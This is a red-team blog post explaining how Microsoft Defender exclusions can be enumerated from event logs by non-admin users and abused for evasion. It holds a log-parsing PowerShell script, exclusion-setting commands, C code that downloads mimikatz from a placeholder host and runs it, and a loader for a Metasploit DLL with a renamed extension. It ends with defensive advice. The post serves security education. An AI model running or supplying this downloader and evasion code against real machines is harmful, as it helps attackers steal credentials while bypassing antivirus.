---
title: Abusing Exclusions To Evade Detection
comments: true
author: Dazzy
date: 2024-08-11 08:15:00 +0800
categories:
  - Red Teaming
  - Defense Evasion
tags:
  - bypass
  - defender
  - exclusions
---

Long time dear readers. In this blog post we'll see how to abuse a common feature in Antivirus and EDRs that's not much talked about. I am using Defender AV as that's common and by default across all Windows Operating Systems but this blog post can be AV and EDR agnostic as exclusion is a feature that's present in all AVs/EDRs and mostly works the similar way only.
What makes this technique particularly dangerous is its subtlety. Unlike more aggressive methods of AV/EDR evasion that might trigger alerts or leave obvious traces, abusing exclusions allows malicious activities to fly under the radar. It's a method that's not commonly discussed or defended against, making it a potent tool in an attacker's arsenal.

### Understanding AV/EDR Exclusions

Antivirus (AV) and Endpoint Detection and Response (EDR) solutions are critical components of modern cybersecurity defenses. They are designed to protect systems from malicious activities. However, they're not perfect and can sometimes interfere with legitimate operations, causing false positives or performance impacts. Knowing this thing only vendors have given an extra feature of Exclusions in them which can be utilized to exclude certain assets be it paths, processes, files and extensions. 

While exclusions are necessary for optimizing performance and reducing false positives, especially in complex enterprise environments, they can also create security blind spots if not managed carefully.

### Types of Exclusions in Defender AV

Let's look at the types of exclusions available in Microsoft Defender AV as an example. While we're focusing on Defender, it's worth noting that most AV/EDR solutions offer similar exclusion capabilities.

| Exclusion Type |                                                  Description                                                  |
| :------------: | :-----------------------------------------------------------------------------------------------------------: |
|      File      |                             Specific file will not be subject to Defender AV scan                             |
|     Folder     |                           Entire directory will be skipped during Defender AV scan                            |
|    Process     | Any activity be it downloading a file, creating a new process or opening an existing file will not be scanned |
|   Extension    |                          Specific file extension will not be subject to Defender AV                           |

### Real world abuse of Exclusions
I wanted to get a picture of how common the abuse of exclusions are in real world. So, I started searching and couldn't find much except for few malwares where it utilized exclusion feature to set and write further malicious tools in the excluded folders. But I couldn't find any blog post or threat report where I could see threat actors looking for already excluded assets and abusing it in someway (if you know any, please send me over).
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/realworld1.png)

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/realworld2.png)

https://www.elastic.co/security-labs/qbot-malware-analysis

### Enumerating Defender AV Exclusions

Enumeration is the first step to any kind of pentesting. Before we delve into how to abusing each kind of exclusions, the attacker first needs to figure out what exclusions are set on the endpoint. Microsoft Defender AV includes PowerShell cmdlets that allow to view and manage its configuration settings. One such cmdlet is `Get-MpPreference`, which provides detailed information about the current settings, including exclusions.

```powershell
Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension
```

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/getmppreference.png)

However, there's a catch: only users with administrative privileges can execute this command. This limitation is designed to protect the configuration settings from unauthorized access.

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/getmppreference2.png)

Even without administrative access, attackers who gain a foothold on a system can infer potential exclusions through various means. One common technique involves enumerating running processes and existing directories on the system to understand which applications are in use. By identifying well-known enterprise applications, attackers can then leverage publicly accessible documentation and vendor recommendations to predict likely exclusions on a target system. Many vendors provide guidelines on recommended exclusions to ensure compatibility and performance, and attackers can use this information to identify potential security gaps. For instance, Microsoft has documented recommended exclusions for products such as Exchange Server, System Center Configuration Manager (SCCM), System Center Operations Manager (SCOM), and Hyper-V. By researching these recommendations, attackers can deduce which exclusions might be configured, allowing them to strategize their attacks more effectively.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/automaticexclusions.png)
**Source:** https://learn.microsoft.com/en-us/defender-endpoint/configure-server-exclusions-microsoft-defender-antivirus

Another method attackers might use is analyzing configuration files or system documentation that could contain exclusion lists. Administrators sometimes leave these files on systems for easy reference, and they can provide valuable insights into the current security posture. By piecing together information from these various sources, attackers can effectively map out the exclusion landscape and strategize their attacks accordingly.

#### Leveraging Defender AV Operational Logs to enumerate Exclusions

Another interesting technique for enumerating Defender AV exclusions involves examining the Windows Defender AV operational logs, which are readable by standard users. By default, Defender AV logs configuration changes, including modifications to exclusions.

A notable approach to leveraging these logs was demonstrated by https://x.com/I_Am_Jakoby. 
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/jakobytweet.png)
He provided a basic script to parse these logs and identify exclusion entries. Building upon his work, I’ve developed a PowerShell script on top of it using ChatGPT (me no credits, me bad coder hehe )that provides better output.
```powershell
function Get-DefenderExclusions {
    param (
        [string]$logName = "Microsoft-Windows-Windows Defender/Operational",
        [int]$eventID = 5007,
        [switch]$Path,
        [switch]$Process,
        [switch]$Extension
    )

    if (-not ($Path -or $Process -or $Extension)) {
        Write-Host "Please specify at least one type of exclusion to filter: -Path, -Process, -Extension."
        return
    }

    # Get all event logs with the specified Event ID
    $events = Get-WinEvent -LogName $logName -FilterXPath "*[System[(EventID=$eventID)]]" -ErrorAction SilentlyContinue

    if (-not $events) {
        Write-Host "No events found with Event ID $eventID in the $logName log."
        return
    }

    # Define the regex patterns for exclusion paths, extensions, and processes
    $patterns = @{
        Path = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\([^`"]+)"
        Extension = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\([^`"]+)"
        Process = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\\([^`"]+)"
    }

    # Function to parse and return unique exclusions
    function Get-UniqueExclusions {
        param (
            [string]$pattern,
            [string]$exclusionType
        )

        $uniqueExclusions = @{}
        foreach ($event in $events) {
            $message = $event.Message
            if ($message -match $pattern) {
                $exclusionDetail = $matches[1] -replace ' = 0x0.*$', '' -replace 'New value:', '' -replace '^\s+|\s+$', ''
                if (-not $uniqueExclusions.ContainsKey($exclusionDetail) -or $event.TimeCreated -gt $uniqueExclusions[$exclusionDetail]) {
                    $uniqueExclusions[$exclusionDetail] = $event.TimeCreated
                }
            }
        }
        return $uniqueExclusions.GetEnumerator() | Sort-Object Value -Descending | ForEach-Object {
            [PSCustomObject]@{
                ExclusionDetail = $_.Key
                TimeCreated = $_.Value
            }
        }
    }

    # Extract and display exclusions based on the provided arguments
    if ($Path) {
        Write-Host "Path Exclusions:"
        Get-UniqueExclusions -pattern $patterns.Path -exclusionType 'Path' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap
    }
    if ($Process) {
        Write-Host "Process Exclusions:"
        Get-UniqueExclusions -pattern $patterns.Process -exclusionType 'Process' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap
    }
    if ($Extension) {
        Write-Host "Extension Exclusions:"
        Get-UniqueExclusions -pattern $patterns.Extension -exclusionType 'Extension' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap
    }
}

# Example usage:
# Get-DefenderExclusions -Path -Process -Extension
# Get-DefenderExclusions -Process
```

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/enumexclusionspscript.png)

As evident from the image above, when we are trying to enumerate exclusions via `Get-MpPreference` we are getting error as we are not administrators but when using the above PowerShell script to find out the same via parsing the event logs we can get the similar results.

### Abusing Defender AV Exclusions

Once an attacker has identified exclusions, they can be abused in various ways depending on the type of exclusion:
#### Abusing Folder Based Exclusions

Folder-based exclusions are perhaps the easiest to exploit. An attacker can simply place malicious files or execute malicious code from within the excluded folder, knowing that the AV/EDR will not scan or monitor activities in that location. An exclusion for a path can be set with the following command.

```powershell
Set-MpPreference -ExclusionPath "C:\Windows\Temp"
```

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811145735.png)

After the attacker has enumerated the path where Defender AV is excluded, they can download the malicious files onto that folder and execute it from there without getting detected.

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/mimikatz1.png)

In the above image the `mimikatz` gets detected and deleted immediately after it's downloaded to the non-excluded folder but in below image, it can be seen when doing the same in excluded folder, Defender AV becomes silent.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/mimikatz2.png)

#### Abusing Process Based Exclusions
According per Microsoft "When you add a process to the process exclusion list, Microsoft Defender Antivirus won't scan files opened by that process, no matter where the files are located. The process itself, however, will be scanned unless it has also been added to the [file exclusion list](https://learn.microsoft.com/en-us/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus)." - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus

This above paragraph is pretty much explanatory. Process based exclusion can be set using the following command.
```powershell
Set-MpPreference -ExclusionProcess "sqlserver.exe"
```
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/process1.png)

In the above example, process based exclusion is set for "sqlserver.exe" process without absolute path. Means if sqlserver.exe is executed from anywhere on the endpoint, any activity done by it wouldn't be scanned which also means if there's a malicious process with same name 'sqlserver' all it's malicious activity will be ignored by Defender AV.

So abusing it at first glance would look like downloading our malicious binary and renaming it to excluded process name but let's see if that works.

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/process2.png)

In the above example, even though I downloaded mimikatz as "sqlserver.exe" which we are sure is excluded but still it was detected and deleted by Defender AV. If we recall the statement by Microsoft again "When you add a process to the process exclusion list, Microsoft Defender Antivirus won't scan files opened by that process, no matter where the files are located. The process itself, however, will be scanned unless it has also been added to the [file exclusion list](https://learn.microsoft.com/en-us/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus)". 

In our case the process which is responsible for downloading mimikatz as sqlserver.exe is PowerShell.exe which is not excluded. If we run PowerShell.exe by renaming it to "sqlserver.exe" then the same activity won't be detected by Defender AV. Rather let's create a simple C code which will just download and execute the downloaded coded (in our case mimikatz)
```c
// gcc downloadExec.c -o downloadExec -lwininet
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

int main() {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;

    // Initialize WinINet
    hInternet = InternetOpenA("Download Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "InternetOpen failed\n");
        return 1;
    }

    // Open a connection to the URL
    hConnect = InternetOpenUrlA(hInternet, "http://<IP>/mimikatz.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "InternetOpenUrl failed\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Create a buffer to store the downloaded data
    char buffer[1024];

    // Open a local file for writing
    FILE* outputFile = fopen("notamalware.exe", "wb");
    if (outputFile == NULL) {
        fprintf(stderr, "Failed to open output file for writing\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Read and write data until the end of the file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, outputFile);
    }

    // Clean up
    fclose(outputFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    TCHAR szCmdline[] = TEXT(".\\notamalware.exe"); 

    // Zero the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a process for the executable in the current directory
    if (!CreateProcess(
        NULL,           // No module name (use command line)
        szCmdline,      // Command line - executable in the current directory
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    )) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return -1;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

```

If we run it as it is then still it'll get detected by Defender AV as shown below.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811160830.png)

Now if we run it after renaming it to "sqlserver.exe", Defender won't catch it and our mimikatz will run.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811161009.png)

In my case, after few seconds, Defender AV was able to detect and delete it. However, when combining it with file based exclusion, it works smoothly.
#### Abusing Extension Based Exclusions

As this sound, in extension based exclusion, if some specific extension is excluded then that wouldn't be scanned by the Defender AV just as shown below where there's an exclusion for `.exe` and we are running mimikatz.exe as it is.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension1.png)

But what if there's an exclusion for non executable extension like ".txt" or any random extension like ".goku", can it still be abused? The answer is "YES". All we have to do is just have our malicious DLL binary to have the extension of the excluded extension and run it.
The beauty about DLL files on windows is that they can technically have any extension, but they are still recognized and executed as DLLs by the operating system because of their internal structure and not solely by their file extension. When an application or system component needs to load a DLL, it uses functions like `LoadLibrary` or `LoadLibraryEx`. These functions read the PE header of the file to determine if it is a valid DLL, regardless of the file extension.

I know mimikatz can be compiled into a DLL but i was too lazy to do it so i instead used metasploit DLL for this example. If I try to download the DLL as it is then it would be caught and deleted by Defender AV.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension2.png)

Now when the same metasploit DLL is downloaded and executed with the excluded extension, Defender goes silent again as shown below.
![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension3.png)

Now what if rundll32.exe (which we used in this case to execute our DLL file) is blocked or you don't want to use it for the reason such LOLBins are highly monitored. You can have your own DLL loader load and execute your malicious DLL as shown below.
```c
#include <windows.h>
#include <stdio.h>

typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

int main() {
    HINSTANCE hinstDLL;
    DllMainFunc DllMain;

    // Load the DLL
    hinstDLL = LoadLibrary("msfmal.goku");
    if (hinstDLL == NULL) {
        printf("Could not load the DLL\n");
        return 1;
    }

    // Get the address of DllMain (this is usually not done, for demonstration only)
    DllMain = (DllMainFunc)GetProcAddress(hinstDLL, "DllMain");
    if (DllMain == NULL) {
        printf("Could not locate the function DllMain\n");
        FreeLibrary(hinstDLL);
        return 1;
    }

    // Call DllMain explicitly (for demonstration only)
    BOOL result = DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL);
    if (result) {
        printf("DllMain executed successfully\n");
    } else {
        printf("DllMain execution failed\n");
    }

    // Free the DLL module
    FreeLibrary(hinstDLL);

    return 0;
}

```

![](https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension4.png)

### Best Practices When Setting Exclusions

- Only implement exclusions when absolutely necessary and after thorough testing.
- Prefer narrow, specific exclusions over broad ones. For example, exclude a specific file rather than an entire folder.
- Implement a process to periodically review all exclusions and remove any that are no longer needed.
- Implement additional monitoring and logging for areas that are excluded from AV/EDR scanning.
- Combine exclusions with application whitelisting to ensure only approved applications can run, even in excluded areas.

### Conclusion

AV/EDR exclusions, while necessary for system functionality, introduce silent bypass opportunities that are often overlooked in security assessments. By understanding these risks and implementing proper management and mitigation strategies, organizations can balance the need for operational efficiency with robust security practices.

As we've seen, the abuse of exclusions can be a powerful and stealthy technique for evading detection. It's crucial for security professionals to be aware of this attack vector and to implement proper controls and monitoring around exclusions.

Remember, security is not about eliminating all risks, but about managing them effectively. Stay vigilant, regularly review your exclusions, and always assume that attackers are looking for these silent pathways into your systems.